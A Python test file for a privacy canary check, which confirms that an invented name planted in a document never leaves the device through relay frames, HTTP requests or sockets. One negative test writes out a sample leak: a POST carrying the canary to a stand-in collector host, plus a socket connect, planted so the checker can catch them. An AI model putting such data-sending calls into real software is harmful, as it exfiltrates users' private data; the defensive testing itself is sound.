"""A canary in an invented document never shows up in recorded traffic that leaves the device.

The claim rests on what was sent, not on the device's own leak checker. scripts/canary_capture.py
plants a new invented name in a document, and a scripted Muse (the planner side) sends MCP calls
as relay frames. The real relay client hands each frame to the real connector app, and the real
Services in DEVICE_ONLY mode do the work. LFM3-VL-2B is faked inside httpx by respx: its name pass
never reports a name, the worst it can do, and every other step says back what it was shown, so
whatever reaches the model comes back out. Waiting results are approved, as a user who taps Share
it on everything would. Recorded: every relay frame the device sends, every HTTP request (respx's
own record and the script's), and every socket attempt, all of which are refused.

The negative tests turn off the device-only name-shape check (the Oct 30 failure,
eval/reports/device_only_fresh_200_leaks.md) and plant a leak by hand, and the check fails both
times. docs/CANARY.md says what this proves and what it does not.
"""

from __future__ import annotations

import json
import re
import socket
from urllib.parse import quote

import httpx
import pytest
import respx

from base.config import load_settings
from base.egress import Egress
from scripts import canary_capture as cc

CHECKER = "http://127.0.0.1:8083/v1"


def _reply(content: str) -> httpx.Response:
    choice = {"message": {"content": content}, "finish_reason": "stop"}
    return httpx.Response(200, json={"model": "lfm3-vl-2b", "choices": [choice]})


def echo_model(request: httpx.Request) -> httpx.Response:
    """LFM3-VL-2B's place: finds no names, and says back whatever it was shown."""
    body = json.loads(request.content)
    fmt = (body.get("response_format") or {}).get("json_schema") or {}
    name, props = fmt.get("name"), (fmt.get("schema") or {}).get("properties", {})
    user = body["messages"][-1]["content"]
    if isinstance(user, list):
        user = " ".join(p.get("text", "") for p in user if isinstance(p, dict))
    seen = " ".join(str(user).split())[:400]
    if "names" in props:
        reply: dict = {"names": []}
    elif "topics" in props:
        reply = {"topics": []}
    elif "queries" in props:
        reply = {"queries": ["herons"]}
    elif "parts" in props:
        reply = {"parts": []}
    elif name == "route":
        reply = {"decision": "ask_user", "reason": "Fixed reply."}
    elif name == "rag_answer":
        reply = {"passages": [1], "answer": seen}
    elif name == "device_answer":
        first = re.search(r"\[1\] [^\n]*\n(.+?)(?:\n\n\[2\]|\n\nQuestion:)", str(user), re.DOTALL)
        quote_ = " ".join(first.group(1).split())[:60].rsplit(" ", 1)[0] if first else ""
        reply = {
            "enough": True,
            "more_queries": [],
            "answer": seen,
            "quotes": [{"passage": 1, "quote": quote_}] if quote_ else [],
        }
    elif "answer" in props:
        reply = {"answer": seen}
    else:
        return _reply(seen)
    return _reply(json.dumps(reply))


@pytest.fixture
def device(tmp_path):
    """(settings, canary, stray, mock): a planted synthetic workspace and the faked local model."""
    canary = cc.make_canary()
    root = tmp_path / "workspace"
    cc.plant(root, canary)
    stray: list[str] = []

    def route(request: httpx.Request) -> httpx.Response:
        if str(request.url).startswith(CHECKER + "/"):
            return echo_model(request)
        stray.append(f"{request.method} {request.url.host}")
        raise httpx.ConnectError("not a model on this device", request=request)

    env = {
        "BASE_HOME": str(tmp_path / "home"),
        "WORKSPACE_ROOT": str(root),
        "BASE_DEVICE": "laptop",
        "DEVICE_ONLY": "1",
        "SEARCH_EMBEDDINGS": "0",
        "CHECKER_URL": CHECKER,
        "LIGHT_SERIAL": "",
        "HEAVY_QUEUE": "0",
        # remote settings DEVICE_ONLY must drop, so nothing remote can be built from them
        "OPENROUTER_API_KEY": "or-key",
        "META_API_KEY": "meta-key",
        "JETSON_LFM_BASE": "https://gateway.example.org/v1",
        "JETSON_LFM_API_KEY": "gw-key",
    }
    with respx.mock(assert_all_called=False) as mock:
        mock.route().mock(side_effect=route)
        yield load_settings(env), canary, stray, mock


def holds(text: str, canary: str) -> bool:
    """Independent of the script's matcher: any word of the canary, any case."""
    return any(w.lower() in text.lower() for w in canary.split())


def test_the_canary_is_in_no_recorded_frame_request_or_socket_that_leaves_the_device(device):
    settings, canary, stray, mock = device
    verdict, capture, line, outputs = cc.run(settings, canary, block="all")
    assert verdict.status == "PASS", verdict.lines()
    # The run did the work: one frame back per call, and the device's model read the canary.
    assert len(line.sent) == len(outputs) + 1 >= len(cc.STEPS) + 1  # + initialize
    model_bodies = [c.request.content.decode() for c in mock.calls]
    assert any(canary in b for b in model_bodies)  # respx's own record: the name pass read it
    # Nothing but the faked local model was asked for anything, and no socket was opened.
    assert stray == []
    assert all(str(c.request.url).startswith(CHECKER + "/") for c in mock.calls)
    assert [s for s in capture.sent if s.channel == "socket"] == []
    # Every frame the device sent toward the relay, and every tool output Muse read.
    assert [f for f in line.sent if holds(f, canary)] == []
    assert [o for o in outputs if holds(o, canary)] == []
    assert any("[Person" in o for o in outputs)  # the name went out as a tag


def test_with_the_name_shape_check_off_the_canary_shows_up_in_the_relay_frames(device, monkeypatch):
    """The Oct 30 failure: a name pass that misses the name and no deterministic check behind it."""
    settings, canary, _stray, _mock = device
    monkeypatch.setattr(Egress, "_redaction_for", lambda self, sources: None)
    verdict, _capture, line, _outputs = cc.run(settings, canary, block="all")
    assert verdict.status == "FAIL" and verdict.frame_hits
    assert any(holds(f, canary) for f in line.sent)


def test_a_planted_leak_is_caught_in_the_url_a_header_the_body_a_frame_and_a_socket():
    canary = cc.make_canary()
    first = canary.split()[0]
    line = cc.RelayLine()
    with respx.mock(assert_all_called=False) as mock, cc.Capture(block="all") as capture:
        mock.route().mock(side_effect=httpx.ConnectError("refused"))
        with pytest.raises(httpx.ConnectError):
            httpx.post(
                f"https://collector.example.org/in?c={quote(canary)}",
                headers={"x-note": first.lower()},
                content=canary.upper().encode(),
            )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            with pytest.raises(ConnectionRefusedError):
                sock.connect(("192.0.2.1", 443))  # TEST-NET-1, never routed
        finally:
            sock.close()
    line.sent.append(
        json.dumps({"type": "response", "id": "f-1", "status": 200, "body": f"written by {first}"})
    )
    verdict = cc.check(capture, line, canary)
    assert verdict.status == "FAIL"
    assert verdict.frame_hits == ["relay frame 1 body"]
    assert verdict.off_device_hits == ["http POST url, header x-note, body"]
    assert "socket connect (blocked) port 443" in verdict.off_device


def test_a_socket_to_loopback_is_allowed_only_in_off_device_mode():
    with cc.Capture(block="off_device") as capture:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            with pytest.raises(OSError):  # nothing listens on port 9 here; the guard let it try
                sock.connect(("127.0.0.1", 9))
        finally:
            sock.close()
    assert [(s.on_device, s.blocked) for s in capture.sent] == [(True, False)]


def test_with_nothing_read_the_result_is_inconclusive():
    verdict = cc.check(cc.Capture(), cc.RelayLine(), cc.make_canary())
    assert verdict.status == "INCONCLUSIVE"


def test_the_matcher_takes_any_word_any_case_and_url_encoding():
    canary = "Zyarvik Quolbrook"
    for text in ("zyarvik", "QUOLBROOK", "Zyarvik%20Quolbrook", "name=Zyarvik+Quolbrook", "x Quolbrook y"):
        assert cc.found_in(text, canary), text
    assert not cc.found_in("[Person 1] counted eleven herons", canary)
    assert len({cc.make_canary() for _ in range(20)}) == 20


def test_the_script_writes_a_log_with_no_header_values_and_exits_0(device, monkeypatch, tmp_path, capsys):
    settings, canary, _stray, _mock = device
    for key in ("DEVICE_ONLY", "CHECKER_URL", "SEARCH_EMBEDDINGS", "BASE_DEVICE"):
        monkeypatch.setenv(
            key,
            {"DEVICE_ONLY": "1", "CHECKER_URL": CHECKER, "SEARCH_EMBEDDINGS": "0", "BASE_DEVICE": "laptop"}[
                key
            ],
        )
    monkeypatch.setenv("CHECKER_API_KEY", "local-secret-value")
    log = tmp_path / "canary.jsonl"
    assert cc.main(["--log", str(log), "--canary", canary, "--block", "all"]) == 0
    out = capsys.readouterr().out
    assert out.startswith("Canary capture: PASS")
    text = log.read_text()
    rows = [json.loads(r) for r in text.splitlines()]
    assert rows[0]["verdict"] == "PASS" and rows[0]["canary"] == canary
    assert any(r.get("channel") == "relay_frame" for r in rows[1:])
    assert "local-secret-value" not in text and "Bearer" not in text  # header names only


def test_the_script_refuses_a_setup_that_is_not_device_only(monkeypatch, capsys):
    monkeypatch.setenv("DEVICE_ONLY", "0")
    monkeypatch.setenv("GLIMMER_BACKEND", "openrouter")
    with pytest.raises(SystemExit):
        cc.main(["--log", "/dev/null"])
    assert "DEVICE_ONLY=1" in capsys.readouterr().err
